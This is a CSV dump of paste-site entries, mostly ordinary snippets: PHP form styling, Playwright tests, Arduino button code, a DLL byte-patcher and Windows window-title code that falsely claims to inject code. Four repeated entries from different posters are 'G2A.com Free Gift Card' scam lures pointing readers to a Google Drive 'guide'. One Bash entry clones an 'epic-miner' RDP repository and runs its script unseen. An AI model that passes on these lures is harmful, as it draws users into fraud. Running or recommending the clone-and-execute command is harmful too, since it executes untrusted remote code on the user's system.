id,title,username,language,date,content
rG92ksd9,🤑G2A.com Free Gift Card FIX July 2024🤑,gigi1964,JavaScript,Saturday 29th of June 2024 06:27:12 AM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
5hqdds1W,Passowrd visibility icon on vendor registration page,palsushobhan,PHP,Saturday 29th of June 2024 06:22:55 AM CDT,"add_action('wcfm_membership_registration_form_after_dynamic_custom_fields', function () {
    ?>
    <style>
        div#wcfm_membership_registration_form_expander {
            position: relative;
        }
        div#wcfm_membership_registration_form_expander span.password-visibility {
            position: absolute;
            right: 20px;
            margin-top: 8px;
        }
    </style>
    <?php
});

add_action('end_wcfm_membership_registration_form', function () {
    ?>
    <script>
    jQuery(function($) {
        $html = '<span class=""wcfmfa fa-eye text_tip password-visibility""></span>';
        $('#wcfm_membership_registration_form input[type=""password""').after($html);
        $('#wcfm_membership_registration_form').on('click', 'span.password-visibility', function(e) {
            $pass_input = $(this).prev('input');
            if($(this).hasClass('fa-eye-slash')) {
                $pass_input[0].type = 'password';
                $(this).removeClass('fa-eye-slash');
                $(this).addClass('fa-eye');
            } else {
                $pass_input[0].type = 'text';
                $(this).removeClass('fa-eye');
                $(this).addClass('fa-eye-slash');
            }
        });
    });
    </script>
    <?php
});"
MzPMJx8Q,🤑G2A.com Free Gift Card FIX July 2024🎁,TeleBot,JavaScript,Saturday 29th of June 2024 06:20:55 AM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Playstation gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
yd17vwMa,🤑G2A.com Free Gift Card FIX July 2024🤑,William95,JavaScript,Saturday 29th of June 2024 06:14:47 AM CDT,"G2A.com complimentary voucher & games guide.
Any voucher for free on G2A.com including Amazon gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
NTPR00AG,pedaliii,BbJLeB,JavaScript,Saturday 29th of June 2024 06:12:51 AM CDT,"const { test, describe, beforeEach, afterEach, beforeAll, afterAll, expect } = require('@playwright/test');
const { chromium } = require('playwright');

const host = 'http://127.0.0.1:5500';

let browser;
let context;
let page;

let user = {
    email: """",
    password: ""123456"",
    confirmPass: ""123456"",
};

let albumName = """";

describe(""e2e tests"", () => {
    beforeAll(async () => {
        browser = await chromium.launch();
    });

    afterAll(async () => {
        await browser.close();
    });

    beforeEach(async () => {
        context = await browser.newContext();
        page = await context.newPage();
    });

    afterEach(async () => {
        await page.close();
        await context.close();
    });

    describe(""authentication"", () => {

        test(""Registration with Valid Data"", async () => {
            await page.goto(host);
            await page.click('text=Register');

            await page.waitForSelector('form');

            let random = Math.floor(Math.random() * 1000);
            user.email = `abv_${random}@abv.bg`;

            await page.locator(""#email"").fill(user.email);
            await page.locator(""#password"").fill(user.password);
            await page.locator(""#conf-pass"").fill(user.confirmPass);
            let [response] = await Promise.all([
                page.waitForResponse(response => response.url().includes('/users/register') && response.status() === 200),
                page.click('[type=""submit""]')
            ]);
            
            await expect(response.ok()).toBeTruthy();
            let userData = await response.json();

            expect(userData.email).toBe(user.email);
            expect(userData.password).toEqual(user.password);

        });

        test(""Login with Valid Data"", async () => {
            await page.goto(host);
            await page.click('text=Login');

            await page.waitForSelector('form');
            
            
            await page.locator(""#email"").fill(user.email);
            await page.locator(""#password"").fill(user.password);
            let [response] = await Promise.all([
                page.waitForResponse(response => response.url().includes(""/users/login"") && response.status() === 200),
                page.click('[type=""submit""]')
            ]);
            
            expect(response.ok()).toBeTruthy();
            let userData = await response.json();
            //console.log(userData);
            expect(userData.email).toBe(user.email);
            expect(userData.password).toEqual(user.password);
        });

        test(""Logout from the Application"", async () => {
            await page.goto(host);
            await page.click('text=Login');

            await page.waitForSelector('form');
            
            await page.locator(""#email"").fill(user.email);
            await page.locator(""#password"").fill(user.password);
            await page.click('[type=""submit""]');

            let [response] = await Promise.all([
                page.waitForResponse(response => response.url().includes(""/users/logout"") && response.status() === 204),
                page.locator('nav >> text=logout').click()
            ]);

            expect(response.ok).toBeTruthy();
            await page.waitForSelector('nav >> text=Login');

            expect(page.url()).toBe(host + ""/"");

        });

    });

    describe(""navbar"", () => {

        test('logged user should see correct navigation', async () => {
            await page.goto(host);

            await page.click('text=Login');
            await page.waitForSelector('form');
            await page.locator(""#email"").fill(user.email);
            await page.locator(""#password"").fill(user.password);
            await page.click('[type=""submit""]')

            await expect(page.locator('nav >> text=Home')).toBeVisible();
            await expect(page.locator('nav >> text=Catalog')).toBeVisible();
            await expect(page.locator('nav >> text=Search')).toBeVisible();
            await expect(page.locator('nav >> text=Create Album')).toBeVisible();
            await expect(page.locator('nav >> text=Login')).toBeHidden();
            await expect(page.locator('nav >> text=Register')).toBeHidden();
        });

        test('guest user should see correct navigation', async () => {
            await page.goto(host);

            await expect(page.locator('nav >> text=Home')).toBeVisible();
            await expect(page.locator('nav >> text=Logout')).toBeHidden();
            await expect(page.locator('nav >> text=Create Album')).toBeHidden();
            await expect(page.locator('nav >> text=Search')).toBeVisible();
            await expect(page.locator('nav >> text=Login')).toBeVisible();
            await expect(page.locator('nav >> text=Register')).toBeVisible();
        });


    });

    describe(""CRUD"", () => {

        test('Create an Album Testing', async () => {
            await page.goto(host);

            await page.click('text=Login');
            await page.waitForSelector('form');
            await page.locator(""#email"").fill(user.email);
            await page.locator(""#password"").fill(user.password);
            await page.click('[type=""submit""]')
            
            await page.click('text=Create Album');
            await page.waitForSelector('form');

            albumName = `Test Album ${Math.floor(Math.random() * 10000)}`;

            await page.fill('input[name=""name""]', albumName);
            await page.fill('input[name=""imgUrl""]', '/images/test.jpg');
            await page.fill('input[name=""price""]', '19.99');
            await page.fill('input[name=""releaseDate""]', '2024-06-29');
            await page.fill('input[name=""artist""]', 'Test Artist');
            await page.fill('input[name=""genre""]', 'Test Genre');
            await page.fill('textarea[name=""description""]', 'Test Description');

            const [response] = await Promise.all([
                page.waitForResponse(response => response.status() === 200 && response.url().includes('/data/albums')),
                page.click('[type=""submit""]')
            ]);

            expect(response.ok()).toBeTruthy();

            const responseBody = await response.json();
            expect(responseBody.name).toBe(albumName);
            expect(responseBody.imgUrl).toBe('/images/test.jpg');
            expect(responseBody.price).toBe('19.99');
            expect(responseBody.releaseDate).toBe('2024-06-29');
            expect(responseBody.artist).toBe('Test Artist');
            expect(responseBody.genre).toBe('Test Genre');
            expect(responseBody.description).toBe('Test Description');
        });

        test(""User is able to edit an album"", async ()=>{
            //arrange
            await page.goto(host);
            await page.click(""text=Login"");
            await page.waitForSelector('form');
            await page.locator('#email').fill(user.email);
            await page.locator('#password').fill(user.password);
            await page.click('[type=""submit""]');
            //act
            await page.click(""text = Search"")
            await page.locator('#search-input').fill(albumName);
            await page.locator('.button-list').click();
            await page.locator('#details').first().click();
            await page.click('text = Edit');
            await page.waitForSelector('form');
            await page.locator('#price').fill(""15"");
 
            let [response] = await Promise.all([page.waitForResponse(response => response.url().includes(""/data/albums"")
            && response.status() == 200), page.click('[type=""Submit""]')
           ]);
           let eventData = await response.json();
           //assert
           await expect(response.ok()).toBeTruthy();
           expect(eventData.name).toEqual(albumName); 
            expect(eventData.imgUrl).toEqual('/images/test.jpg');
            expect(eventData.price).toEqual('15');
            expect(eventData.releaseDate).toEqual('2024-06-29');
            expect(eventData.artist).toEqual('Test Artist');
            expect(eventData.genre).toEqual('Test Genre');
            expect(eventData.description).toEqual('Test Description');
        })
 
        test(""User is able to delete an album"", async ()=>{
            //arrange
            await page.goto(host);
            await page.click(""text=Login"");
            await page.waitForSelector('form');
            await page.locator('#email').fill(user.email);
            await page.locator('#password').fill(user.password);
            await page.click('[type=""submit""]');
            //act
            await page.click(""text = Search"")
            await page.locator('#search-input').fill(albumName);
            await page.locator('.button-list').click();
            await page.locator('#details').first().click();
          //  await page.locator(""text = Delete"").click();
            let [response] = await Promise.all([page.waitForResponse(response => response.url().includes(""/data/albums"")
            && response.status() == 200),
            page.on('dialog', dialog => dialog.accept()),
            page.click('text = Delete')
           ]);
 
           //assert
           await expect(response.ok()).toBeTruthy();
        });
 
    });
});
"
YEDS8jMk,Untitled,jaVer404,Python,Saturday 29th of June 2024 06:10:49 AM CDT,"def split_pages(file_path):
    # Відкриваємо файл з кодуванням cp1251
    with open(file_path, 'r', encoding='cp1251') as file:
        text = file.read()

    # Розділяємо текст на сторінки за символом розриву сторінки '\f'
    pages = text.split('\x0c')

    # Обрізаємо зайві пробіли з початку та кінця кожної сторінки
    pages = [page.strip() for page in pages]

    return pages"
sQdrc6w0,🤑G2A.com Free Gift Card FIX July 2024🎁,romikdikson,JavaScript,Saturday 29th of June 2024 06:08:44 AM CDT,"G2A.com free voucher & games guide.
Any voucher for free on G2A.com including Playstation gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
ezhWepZC,data972,TestGuy1,JSON,Saturday 29th of June 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'ab9cab1856b66ba0ede208e38af1d0bb328cf8baa57543466e2d4278a8232f061665161e0085f645f510a512d5b838991367eca89c73c68511e4d43f3c4e17138d2b8cb3156381921ede3cbbe20064848c80bdc29923a6868fbfacd59d9f33a8e4d88c69c1a431be6b0457d1466a954efe43df93cb04e347db2294fb04ac814e',
  otherdata: [
    'df74303aa01cf4e8cb9c9e356ff825e8',
    '1ce20219d96235daf516878b84275913',
    '866e4ae06a871f15709a46f3533d9643',
    '62f41249085fa8bee7d052e1629e68b9',
    'afd4dcf5e5683568f8baa1b72f9cd3ca',
    'af3622ddee5934b17ba3e75a8208645d',
    '425ced06dd8671d8b69675a3dcaa2f88',
    'a81a0f831895273693b18822777918a9'
  ]
}"
wCfNqHhb,"""Button Handling"" rev_01",pleasedontcode,Arduino,Saturday 29th of June 2024 05:10:30 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Button Handling""
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2024-06-29 10:09:06

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Create an Arduino project utilizing the PCA9685 */
	/* and EasyButton libraries to manage push buttons on */
	/* pins D2, D3, D4, D5, and D6. Configure pins with */
	/* INPUT_PULLUP and implement a loop function to */
	/* detect and respond to button presses. */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>  // https://github.com/evert-arias/EasyButton

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t PushButton_PIN_D2 = 2;
const uint8_t PushButton_PIN_D3 = 3;
const uint8_t PushButton_PIN_D4 = 4;
const uint8_t Home_PushButton_PIN_D5 = 5;
const uint8_t Home_PushButton_PIN_D6 = 6;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
EasyButton button1(PushButton_PIN_D2);
EasyButton button2(PushButton_PIN_D3);
EasyButton button3(PushButton_PIN_D4);
EasyButton button4(Home_PushButton_PIN_D5);
EasyButton button5(Home_PushButton_PIN_D6);

/****** CALLBACK FUNCTIONS *****/
void onButton1Pressed() {
  Serial.println(""Button 1 pressed"");
}

void onButton2Pressed() {
  Serial.println(""Button 2 pressed"");
}

void onButton3Pressed() {
  Serial.println(""Button 3 pressed"");
}

void onButton4Pressed() {
  Serial.println(""Button 4 pressed"");
}

void onButton5Pressed() {
  Serial.println(""Button 5 pressed"");
}

void setup(void) {
  // Initialize Serial for debugging purposes
  Serial.begin(115200);

  Serial.println();
  Serial.println("">>> EasyButton multiple buttons example <<<"");

  // Initialize buttons
  button1.begin();
  button2.begin();
  button3.begin();
  button4.begin();
  button5.begin();

  // Attach callback functions
  button1.onPressed(onButton1Pressed);
  button2.onPressed(onButton2Pressed);
  button3.onPressed(onButton3Pressed);
  button4.onPressed(onButton4Pressed);
  button5.onPressed(onButton5Pressed);
}

void loop(void) {
  // Continuously read the status of the buttons
  button1.read();
  button2.read();
  button3.read();
  button4.read();
  button5.read();
}

/* END CODE */"
rjrEFAmt,rdp-gcshell,maruf17,Bash,Saturday 29th of June 2024 04:49:36 AM CDT,"git clone https://github.com/epic-miner/RDP.git
cd RDP
sh aman.sh

"
NYxxdNLi,API-Hooking-Process,alien_fx_fiend,C++,Saturday 29th of June 2024 04:34:05 AM CDT,"#include <Windows.h>
#include <string>
#include <TlHelp32.h>
#include <tchar.h>
#include <Psapi.h>
#include <iostream>

#pragma comment(lib, ""Psapi.lib"")

BOOL notepadHooked = FALSE;
BOOL notepadPlusPlusHooked = FALSE;

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        std::wcout << L""LookupPrivilegeValue error: "" << GetLastError() << std::endl;
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        std::wcout << L""AdjustTokenPrivileges error: "" << GetLastError() << std::endl;
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::wcout << L""The token does not have the specified privilege. \n"" << std::endl;
        return FALSE;
    }

    return TRUE;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess != NULL) {
        TCHAR szProcessName[MAX_PATH] = TEXT(""<unknown>"");
        if (GetModuleFileNameEx(hProcess, NULL, szProcessName, MAX_PATH)) {
            std::wstring processName(szProcessName);
            size_t pos = processName.find_last_of(L""\\"");
            if (pos != std::wstring::npos) {
                processName = processName.substr(pos + 1);
            }
            CloseHandle(hProcess);

            TCHAR windowTitle[MAX_PATH];
            GetWindowText(hwnd, windowTitle, MAX_PATH);

            std::wcout << L""Process: "" << processName << L"", Window Title: "" << windowTitle << std::endl;

            if (processName == L""notepad.exe"") {
                std::wstring newTitle = L""Wormhole Vortex"";
                if (SetWindowText(hwnd, newTitle.c_str())) {
                    std::wcout << L""Modified window title of "" << processName << std::endl;
                    notepadHooked = TRUE;
                }
                else {
                    std::wcout << L""Failed to modify window title of "" << processName << std::endl;
                }
            }
            if (processName == L""notepad++.exe"") {
                std::wstring newTitle = L""Wormhole Vortex"";
                if (SetWindowText(hwnd, newTitle.c_str())) {
                    std::wcout << L""Modified window title of "" << processName << std::endl;
                    notepadPlusPlusHooked = TRUE;
                }
                else {
                    std::wcout << L""Failed to modify window title of "" << processName << std::endl;
                }
            }
        }
        else {
            std::wcout << L""GetModuleFileNameEx error: "" << GetLastError() << std::endl;
        }
    }
    return TRUE;
}

int main() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::wcout << L""OpenProcessToken error: "" << GetLastError() << std::endl;
        return 1;
    }

    if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
        std::wcout << L""Failed to enable debug privilege."" << std::endl;
        CloseHandle(hToken);
        return 1;
    }

    EnumWindows(EnumWindowsProc, 0);

    if (notepadHooked) {
        std::cout << ""Notepad.exe window titles modified successfully."" << std::endl;
    }
    else {
        std::cout << ""Unable to modify Notepad.exe window titles."" << std::endl;
    }

    if (notepadPlusPlusHooked) {
        std::cout << ""Notepad++.exe window titles modified successfully."" << std::endl;
    }
    else {
        std::cout << ""Unable to modify Notepad++.exe window titles."" << std::endl;
    }

    std::cout << ""Press enter to exit..."";
    std::cin.get();

    SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);
    CloseHandle(hToken);
    return 0;
}
"
N8T9fM2m,ScriptHookV_Patch.html,Thunder-Menu,HTML,Saturday 29th of June 2024 04:33:09 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Hex Pattern Replacer</title>
</head>
<body>
    <h1>Replace Hex Pattern in ScriptHookV.dll</h1>
    <input type=""file"" id=""fileInput"" />
    <p id=""status""></p>

    <script>
        document.getElementById('fileInput').addEventListener('change', replaceHexPattern);

        function replaceHexPattern(event) {
            const file = event.target.files[0];

            if (!file) {
                document.getElementById('status').textContent = 'Please select a file.';
                return;
            }

            const reader = new FileReader();
            reader.onload = function(event) {
                const arrayBuffer = event.target.result;
                const uint8Array = new Uint8Array(arrayBuffer);
                const hexPattern = [0x74, 0x3A, 0x48, 0x8D, 0x0D];
                const replacementPattern = [0xEB, 0x3A, 0x48, 0x8D, 0x0D];

                for (let i = 0; i < uint8Array.length - hexPattern.length; i++) {
                    let match = true;
                    for (let j = 0; j < hexPattern.length; j++) {
                        if (uint8Array[i + j] !== hexPattern[j]) {
                            match = false;
                            break;
                        }
                    }
                    if (match) {
                        for (let j = 0; j < replacementPattern.length; j++) {
                            uint8Array[i + j] = replacementPattern[j];
                        }
                        break;
                    }
                }

                const blob = new Blob([uint8Array], { type: 'application/octet-stream' });
                const link = document.createElement('a');
                link.href = URL.createObjectURL(blob);
                link.download = 'ScriptHookV_modified.dll';
                link.click();

                document.getElementById('status').textContent = 'Pattern replaced and file downloaded.';
            };
            reader.readAsArrayBuffer(file);
        }
    </script>
</body>
</html>
"
6KHPQ7MX,API-Hooking-Example,alien_fx_fiend,C++,Saturday 29th of June 2024 04:32:22 AM CDT,"#include <windows.h>
#include <iostream>

int main() {
    HWND hwnd = FindWindow(NULL, L""*Untitled - Notepad""); // search for ""*Untitled - Notepad""
    if (hwnd != NULL) {
        SetWindowText(hwnd, L""Wormhole Vortex""); // change the title of the window
        std::cout << ""Code Injected Successfully into Notepad Process!"" << std::endl; // print the message to the console
    }
    else {
        hwnd = FindWindow(NULL, L""Untitled - Notepad""); // search for ""Untitled - Notepad""
        if (hwnd != NULL) {
            SetWindowText(hwnd, L""Wormhole Vortex""); // change the title of the window
            std::cout << ""Code Injected Successfully into Notepad Process!"" << std::endl; // print the message to the console
        }
        else {
            std::cout << ""No window with the specified title was found."" << std::endl;
        }
    }

    // Keep the console window open
    std::cout << ""Press any key to exit..."" << std::endl;
    std::cin.get();

    return 0;
}"
